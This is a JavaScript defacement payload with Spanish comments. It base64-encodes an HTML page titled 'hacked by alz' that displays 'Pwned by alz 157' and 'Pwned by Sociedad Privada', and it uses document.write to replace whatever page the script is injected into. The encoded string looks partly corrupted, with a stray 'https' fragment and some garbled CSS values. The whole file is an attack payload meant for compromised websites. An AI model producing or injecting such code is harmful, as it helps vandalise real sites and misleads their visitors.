(function(){
  // HTML que se inyectará por completo (usa tu HTML)
  const htmlB64 = ""
  + "PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVV"
  + "EYtOCI+CiAgICA8dGl0bGU+aGFja2VkIGJ5IGFsemAnPC90aXRsZT4KCiAgICA8bGluayBocmVmPSI"
  + "httpsOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9U2hhcmUrVGVjaCtNb25vJmRpc3Bs"
  + "YXk9c3dhcCIgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgIC"
  + "AgICAgICAgYmFja2dyb3VuZDogIzAwMCAgdXJsKCdodHRwczovL2dpdGh1Yi5jb20vc3N0aXZlbm9sbW"
  + "9zMjctZGV2LzE1Ny9ibG9iL21haW4vMTU3YWx6V0hJVEUucG5nP3Jhdy10cnVlJykgbm8tcmVwZWF0IG"
  + "NlbnRlciBjZW50ZXIgZml4ZWQ7CiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgIC"
  + "AgICAgICAgICAgIGNvbG9yOiAjYzBjMGMwOwogICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdTaGFyZS"
  + "BUZWNoIE1vbm8nLCBtb25vc3BhY2U7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcG"
  + "FkZGluZzogMDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgIH0KCiAgICAgIC"
  + "AgIC5vdmVybGF5IHsKICAgICAgICAgICAgYmFja2dyb3VuOiByZ2JhKDAgLCAwLCAwLCAwLjg1KTsKIC"
  + "AgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsKICAgIC"
  + "AgICAgICAgICBwYWRkaW5nOiA0MHB4IDIwcHg7CiAgICAgICAgfQoKICAgICAgICAgLmxvZ28gaW1nIH"
  + "sKICAgICAgICAgICAgd2lkdGg6IDIwMHB4OwogICAgICAgICAgICAgbWFyZ2luLXRvcDogMzBweDsKIC"
  + "AgICAgICAgICAgIGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaGFkb3coMCAwIDI1cHggIzY"
  + "2MDAwKTsKICAgICAgICAgICAgYW5pbWF0aW9uOiBkb3JrcHVsc2UgMyVzIGluZmluaXRlOwogICAgICAg"
  + "fQoKICAgICAgICAgIGgxIHsKICAgICAgICAgICAgZm9udC1zaXplOiAzLjVlbTsKICAgICAgICAgICAgY"
  + "29sb3I6ICNhMGEwYTsKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4ICM2NjAwMDAsIDAgMD"
  + "AgMjVweCB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgICAgIGFuaW1hdGlvbjog"
  + "ZmxpY2tlciA1cyBpbmZpbml0ZTsKICAgICAgICAgIH0KCiAgICAgICAgLmRhcmstdGV4dCB7CiAgICAgI"
  + "CAgICAgIGZvbnQtc2l6ZTogMS4xZW07CiAgICAgICAgICAgIG1heC13aWR0aDogNzUwcHg7CiAgICAgIC"
  + "AgICAgIG1hcmdpbiA0MHB4IGF1dG87CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjdlbTsKICAgIC"
  + "AgICAgICAgICBjb2xvcjogI2IzYjNiMzsKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCA2cHggIzM"
  + "zMDAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDIsIDIsIDIsIDAuNyk7CiAgICAgICAgICAgI"
  + "HBhZGRpbmc6IDI1cHg7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICAgICAgYm"
  + "9yZGVyOiAxcHggc29saWQgcmdiYSgxMDAsMCwwLDAuMyk7CiAgICAgICAgfQoKICAgICAgICAgLmZvb3R"
  + "lciB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMC44NWVtOwogICAgICAgICAgICBjb2xvcjogIzY2NjY"
  + "7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDUwcHg7CiAgICAgICAgICAgIHRleHQtc2hhZG93OiAwIDA"
  + "gOHB4ICMzMzAwMDA7CiAgICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBkYXJrcHVsc2UgewogICAgICAg"
  + "ICAgICAgZnJvbSB7IGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaGFkb3coMCAwIDVweCAjM"
  + "zMwMDAwKTsgfQogICAgICAgICAgICB0byB7IGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaG"
  + "Fkb3coMCAwIDM1cHggIzY2MDAwKTsgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBmbGlja2"
  + "VyIHsKICAgICAgICAgICAgMCUsIDE5JSwgMjElLCAyMyUsIDI1JSwgNTQlLCA1NiUsIDEwMCUgeyBvcGFj"
  + "aXR5OiAxOyB9CiAgICAgICAgICAgMjAlLCAyNCUsIDU1JSB7IG9wYWNpdHk6IDAuNjsgfQogICAgICAgIC"
  + "AgICAgMjIlIHsgb3BhY2l0eTogMC4zOyB9CiAgICAgICAgfQoKICAgIDwvc3R5bGU+CjxicmFuayB0aGUg"
  + "Zm9ybWF0IGhlcmU+PC9oZWFkPgoKPGJvZHk+CiAgICAgIDxkaXYgY2xhc3M9Im92ZXJsYXkiPgogICAgICAg"
  + "IDxkaXYgY2xhc3M9ImxvZ28iPgogICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL3"
  + "NzdGl2ZW5vbG1vczI3LWRldi8xNTcvYmxvYi9tYWluL3N1cGVyaW9yLmpwZz9yYXctdHJ1ZSIgYWx0PSJB"
  + "bHoiIExvZ28iPgogICAgICAgIDwvZGl2PgoKICAgICAgICAKICAgICAgICA8aDE+UHduZWQgYnkgYWx6JyA"
  + "xNTc8L2gxPgoKICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgIOKAlCBQd25lZCBieSBT"
  + "b2NpZGFkIFByaXZhZGEgLSAxNTcg4oCPC9kaXY+CgogICAgICA8L2Rpdj4KICAgIDwvZGl2Pgo8L2JvZHkK"
  + "PC9odG1sPg==";

  // Decodifica base64 preservando UTF-8
  function b64ToUtf8(b64) {
    const binary = atob(b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    try {
      return new TextDecoder('utf-8').decode(bytes);
    } catch (e) {
      return binary;
    }
  }

  const html = b64ToUtf8(htmlB64);

  // Reemplaza por completo el documento actual
  document.open();
  document.write(html);
  document.close();
})();
